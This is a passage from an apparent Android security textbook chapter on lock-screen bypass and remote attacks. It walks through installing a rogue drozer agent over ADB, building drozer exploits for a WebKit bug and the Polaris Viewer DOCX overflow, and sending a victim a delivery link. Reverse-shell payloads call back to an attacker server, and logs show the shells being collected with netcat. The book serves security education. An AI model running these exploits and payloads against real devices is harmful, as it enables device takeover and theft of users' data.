has stolen these credentials somehow to reset the lock screen on any of them. Figure 8.4 shows the Device
Manager web interface after clicking the Lock button and the message presented on the locked device.
Figure 8.3 Showing the Forgot pattern? button and the resulting screen by pressing it
Figure 8.4 The Android Device Manager Lock functionality and the resulting screen of the locked device
There may also be ways to reset a device's lock screen specific to a device or manufacturer. Some manufacturers
like to include their own applications on devices and this could very well include functionality to reset the lock
screen. You would have to investigate this for the device in question but it would almost certainly require a form
of authentication similar to the standard Android equivalents. If appropriate authentication is not required to
perform a reset using one of these custom features, it is considered a vulnerability in itself.
Installing a Rogue drozer Agent through ADB
After you have an ADB shell, you will be able to install tools on the device that allow you to access them
remotely. A rogue drozer agent could be generated and installed on the device with ADB access. However, the
agent would have to be started for the first time from ADB as well because Android applications are disabled by
default when they are installed. To kickstart the agent you can invoke it using one of the ways mentioned in the
“Rogue Agents” section earlier in this chapter. The most reliable way to install a rogue agent on modern devices
is starting its service as follows:
shell@android:/ $ am startservice -n com.mwr.dz/.Agent
You can find an automated drozer module that can install a rogue agent very quickly and invoke it at
exploit.usb.socialengineering.usbdebugging. Here is an example of using it:
$ drozer exploit build exploit.usb.socialengineering.usbdebugging
--server 192.168.1.102
[*] Building Rogue Agent...
[*] Checking adb setup...
[+] adb is set up correctly
[*] Connect device and press [ENTER]
[*] Attempting to install agent...
[+] Rogue Agent installed
[*] Attempting to kick start drozer agent - Method 1 (Service)
[+] Service started. You should have a connection on your server
Directly after the service starts, a new drozer session is established with the drozer server:
2014-10-30 21:16:28,925 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 5fe89aa7ae424b6
Performing this method from an ADB shell obtained through exploiting an unlocked bootloader will not work.
Instead, the focus should be to bypass the lock screen and obtain an ADB shell on the working system. From the
exploited bootloader you can push a new application and essentially “install” it by simply placing a new APK into
the /data/app/ directory on the device via ADB. However, you would need to find another method to invoke the
agent and enable it for the first run.
Practical Remote Attacks
Knowing which attacks will work against a particular target and the various versions of Android is what makes a
successful hacker. This section presents a practical hands-on approach to hacking Android devices remotely.
Knowing the steps a hacker has to take helps security professionals develop ways to prevent attacks.
Remote Exploits
Remote exploits are the ideal attack for someone wanting to stay anonymous. They can be launched over the
Internet seemingly without repercussions and tracing their origin is difficult. We cover examples of remote
exploits and use them to explore three modes of exploitation with drozer's payload:
Loading a drozer JAR that loads a limited agent
Installing and starting a rogue drozer agent by abusing INSTALL_PACKAGES
Loading a drozer JAR that is passed Context
These modes will be explored respectively in each subsection.
Browser Memory Corruption
Memory corruption exploits are some of the most technical exploits in existence. People are constantly targeting
users' browsers for exploitation, and this also means that Google has spent a lot of time and money ramping up
exploit mitigations. Browser exploits on the latest versions of Android have to be crafted to bypass several
exploit mitigations as well as trigger the vulnerability reliably. Let us rewind back to simpler times for exploit
writers when hardly any exploit mitigations were implemented. CVE-2010-1759 is a WebKit vulnerability in the
DOM normalize method reported by Mark Dowd. We do not delve into the technicalities of the exploit but
rather just use a drozer exploit on an Android 2.2 device.
To begin, you would need to start a drozer server and use the exploit module for this issue at
exploit.remote.browser.normalize with a reverse TCP weasel payload. To push the exploit to a drozer server,
use the following command:
$ drozer exploit build exploit.remote.browser.normalize --payload
weasel.reverse_tcp.armeabi --server 192.168.1.112 --push-server
127.0.0.1 --resource /
Uploading weasel to /weasel and W... [ OK ]
Packaging an Agent... (this may take some time)
Uploading the Agent to /agent.apk and A... [ OK ]
Uploading blank page to /... [ OK ]
Uploading Exploit to /... [ OK ]
Done. The exploit is available on: http://192.168.1.112:31415/
The --push-server means that you want to push the exploit pages to the drozer server, which is on your local
computer but specifying --server as the network IP address where the weasel payload must call back to. If you
specify the --server as 127.0.0.1, then when the exploit payload executes it tries to connect to itself rather than
the drozer server. This is useful if you are exposing the drozer server to the Internet and want to push the
exploit resources to it from your internal network.
Browsing to this server from an Android 2.2 device yields the following in the drozer server log and promptly
closes the browser:
2014-11-09 15:02:03,914 - drozer.server.protocols.http - INFO - GET /
2014-11-09 15:02:26,221 - drozer.server.protocols.byte_stream - INFO -
MAGIC W
2014-11-09 15:02:26,461 - drozer.server.protocols.shell - INFO -
accepted shell from 192.168.1.112:46376
2014-11-09 15:02:26,465 - drozer.server.protocols.http - INFO - GET
/agent.jar
2014-11-09 15:02:26,470 - drozer.server.protocols.http - INFO - GET
/agent.apk
2014-11-09 15:02:28,416 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 1rp1edub6ieru
This output tells you two things: You got a normal reverse shell connection connected to the drozer server as
well as a proper drozer connection. Querying the server confirms the drozer connection:
$ drozer console devices
List of Bound Devices
Device ID Manufacturer Model Software
1rp1edub6ieru unknown unknown unknown
Connecting to the instance shows that the prompt is dz-limited>, and typing permissions confirms that you
have no Context:
$ drozer console connect 1rp1edub6ieru
.. ..:.
..o.. .r..
..a.. . ....... . ..nd
ro..idsnemesisand..pr
.otectorandroidsneme.
.,sisandprotectorandroids+.
..nemesisandprotectorandroidsn:.
.emesisandprotectorandroidsnemes..
..isandp,..,rotectorandro,..,idsnem.
.isisandp..rotectorandroid..snemisis.
,andprotectorandroidsnemisisandprotec.
.torandroidsnemesisandprotectorandroid.
.snemisisandprotectorandroidsnemesisan:
.dprotectorandroidsnemesisandprotector.
drozer Console (v2.3.4)
dz-limited> permissions
Has ApplicationContext: NO
This type of session disables all functionality that requires Context but still has useful tools for pilfering files off
the device and escalating privileges. With this session you can get a normal shell by typing:
dz-limited> shell
$ id
uid=10019(app_19) gid=10019(app_19) groups=1015(sdcard_rw),3003(inet)
$ exit
This spawns a shell session from within drozer. However, let us turn back to the other reverse shell connection
we got on the drozer server. You can interact with it by connecting to the drozer server with netcat or telnet as
follows and typing COLLECT:
$ nc 127.0.0.1 31415
COLLECT
drozer Shell Server
-------------------
There are 1 shells waiting...
192.168.1.112:46376
Shell: 192.168.1.112:46376
Selecting Shell: 192.168.1.112:46376
$ id
uid=10019(app_19) gid=10019(app_19) groups=1015(sdcard_rw),3003(inet)
$ ^C
Terminating the shell with Control+C instead of typing exit is very important. Typing exit will actually close
the shell connection with the remote victim. Admittedly, this example is quite old. However, there has been a
decline in memory corruption exploits for the Android browser being released publicly in the past years. The
exploitation concepts and the use of drozer would be exactly the same as shown in the example here; however,
the internals of the exploit would be far more sophisticated.
Polaris Viewer Memory Corruption
Polaris Viewer is an application that was created by Infraware to read office documents and PDFs. It comes pre-
installed on some devices by default because the manufacturer has agreements with Infraware. At Mobile
Pwn2Own in 2012, a team from MWR InfoSecurity demonstrated an exploit against a Samsung Galaxy S3. This
was in fact an exploit affecting Polaris Viewer via a crafted DOCX file. There was a stack-based overflow in the
parsing of the adj tag of a VML shape that took place in the bundled native Polaris library. Taking control of the
Polaris Viewer process was possible by exploiting this vulnerability. However, it was also found that the
application held the INSTALL_PACKAGES permission. This meant that after code execution was obtained, an
arbitrary new application could also be installed on the device.
An exploit for this issue is present in drozer as the
exploit.remote.fileformat.polarisviewerbof_browserdelivery module. This exploit hosts the malicious
document on a drozer server as well as an extra file named auth.bin. These files are automatically downloaded
when you visit the drozer server from the phone's browser. The auth.bin file is present because of the way the
exploit works. All that the exploit does is set up the call to execute an external script file, which in this case is
auth.bin. This was done out of necessity because of the exploit mitigations present on the Galaxy S3 that made
exploitation difficult. As a result of the exploit mitigations, the exploit in drozer is also dependent on a certain
linker being present on the device—particularly, the linker provided by T-Mobile for this exact compiled
version of the device software. To set up this attack using drozer you would need to start a drozer server and
then upload the resources to it as follows:
$ drozer exploit build exploit.remote.fileformat.polarisviewerbof
_browserdelivery --payload weasel.shell.armeabi --server 192.168.1.112
Uploading weasel to /weasel and W... [ OK ]
Packaging an Agent... (this may take some time)
Uploading the Agent to /agent.apk and A... [ OK ]
Uploading blank page to /... [ OK ]
Uploading shell script to auth.bin... [ OK ]
Uploading document to /download.docx... [ OK ]
Uploading web delivery page to \/view\.jsp\?token\=iSI2hvwNosnZiWoq...
[ OK ]
Done. Exploit delivery page is available on:
http://192.168.1.112:31415/view.jsp?token=iSI2hvwNosnZiWoq
The victim who has a vulnerable device can now be sent this “unique” link to click on and download her
awaiting document. After she does this, her browser will automatically download the malicious documents and
the accompanying exploit that writes out weasel using shell commands. When the user visits the website, the
drozer server shows the following log entries:
2014-11-09 21:49:42,320 - drozer.server.protocols.http - INFO - GET /
2014-11-09 21:49:49,112 - drozer.server.protocols.http - INFO - GET /
2014-11-09 21:51:10,112 - drozer.server.protocols.http - INFO - GET
/view.jsp?token=iSI2hvwNosnZiWoq
2014-11-09 21:51:10,309 - drozer.server.protocols.http - INFO - GET
/auth.bin
2014-11-09 21:51:10,828 - drozer.server.protocols.http - INFO - GET
/auth.bin
2014-11-09 21:51:17,381 - drozer.server.protocols.http - INFO - GET
/download.docx
2014-11-09 21:51:17,580 - drozer.server.protocols.http - INFO - GET
/download.docx
At this point the user has received both files. Figure 8.5 shows screenshots of how this looks from the user's
perspective.
Figure 8.5 A Samsung Galaxy S3 device visiting the exploit page and receiving the exploit files
If the user tries to open auth.bin, nothing will happen because the device has no application to open .bin files.
If the user opens the download.docx it will trigger the exploit chain and the device will be compromised. After
the document opens, the drozer server log shows the following:
2014-11-09 21:52:30,906 - drozer.server.protocols.shell - INFO -
accepted shell from 192.168.1.109:48592
2014-11-09 21:52:30,907 - drozer.server.protocols.http - INFO - GET
/agent.jar
2014-11-09 21:52:30,909 - drozer.server.protocols.http - INFO - GET
/agent.apk
2014-11-09 21:52:31,964 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 3493i4n3ibqrl
2014-11-09 21:52:37,356 - drozer.server.protocols.drozerp.drozer - INFO
- accepted connection from 1b6b125f54bdda30
We got three connections from this device! One is a normal reverse shell connection and the other two are
drozer connections. Querying the drozer server for the connected devices reveals the following:
$ drozer console devices
List of Bound Devices
Device ID Manufacturer Model Software
1b6b125f54bdda30 samsung GT-I9300 4.0.4
3493i4n3ibqrl unknown unknown unknown
The first entry is a drozer connection where it was able to retrieve the manufacturer, model, and software
version. This means that the exploit must have been able to install the full drozer exploit agent and obtain
Context. This is plausible because the Polaris Viewer application held the INSTALL_PACKAGES permission.
Connecting to the session confirms this:
$ drozer console connect 1b6b125f54bdda30
.. ..:.
..o.. .r..
..a.. . ....... . ..nd
ro..idsnemesisand..pr
.otectorandroidsneme.
.,sisandprotectorandroids+.
..nemesisandprotectorandroidsn:.
.emesisandprotectorandroidsnemes..
..isandp,..,rotectorandro,..,idsnem.
.isisandp..rotectorandroid..snemisis.
,andprotectorandroidsnemisisandprotec.
.torandroidsnemesisandprotectorandroid.
.snemisisandprotectorandroidsnemesisan:
.dprotectorandroidsnemesisandprotector.
drozer Console (v2.3.4)
dz> permissions
Has ApplicationContext: YES
Available Permissions:
- android.permission.ACCESS_COARSE_LOCATION
- android.permission.ACCESS_FINE_LOCATION
- android.permission.ACCESS_LOCATION_EXTRA_COMMANDS
- android.permission.ACCESS_MOCK_LOCATION
- android.permission.ACCESS_NETWORK_STATE
- android.permission.ACCESS_WIFI_STATE
- android.permission.AUTHENTICATE_ACCOUNTS
- android.permission.BATTERY_STATS
- android.permission.BLUETOOTH
- android.permission.BLUETOOTH_ADMIN
- android.permission.BROADCAST_STICKY
- android.permission.CALL_PHONE
- android.permission.CAMERA
- android.permission.CHANGE_CONFIGURATION
- android.permission.CHANGE_NETWORK_STATE
- android.permission.CHANGE_WIFI_MULTICAST_STATE
- android.permission.CHANGE_WIFI_STATE
- android.permission.CLEAR_APP_CACHE
- android.permission.DISABLE_KEYGUARD
- android.permission.EXPAND_STATUS_BAR
- android.permission.FLASHLIGHT
- android.permission.GET_ACCOUNTS
- android.permission.GET_PACKAGE_SIZE
- android.permission.GET_TASKS
- android.permission.INTERNET
- android.permission.KILL_BACKGROUND_PROCESSES
- android.permission.MANAGE_ACCOUNTS
- android.permission.MODIFY_AUDIO_SETTINGS
- android.permission.MOUNT_FORMAT_FILESYSTEMS
- android.permission.MOUNT_UNMOUNT_FILESYSTEMS
- android.permission.NFC
- android.permission.PERSISTENT_ACTIVITY
- android.permission.PROCESS_OUTGOING_CALLS
- android.permission.READ_CALENDAR
- android.permission.READ_CONTACTS
- android.permission.READ_LOGS
- android.permission.READ_PHONE_STATE
- android.permission.READ_PROFILE
- android.permission.READ_SMS